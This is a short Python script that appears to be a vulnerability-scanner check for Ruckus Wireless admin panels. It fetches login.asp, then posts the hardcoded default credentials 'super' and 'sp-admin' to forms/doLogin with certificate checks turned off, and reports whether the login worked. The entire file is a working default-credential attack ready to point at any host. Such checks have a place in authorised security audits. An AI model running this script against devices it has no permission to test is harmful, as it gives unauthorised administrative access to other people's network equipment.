import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login.asp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	session=requests.Session()
	response=session.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Ruckus Wireless Admin" in response.text:
		check=True
	else:
		check=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"forms/doLogin"
	body="login_username=super&password=sp-admin"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=session.post(url,body,headers=headers,timeout=5,verify=False)
	if '<frame src="bottom.asp' in response.text:
		ruckus=True
	else:
		ruckus=False
	if check and ruckus:
		return True
	else:
		return False
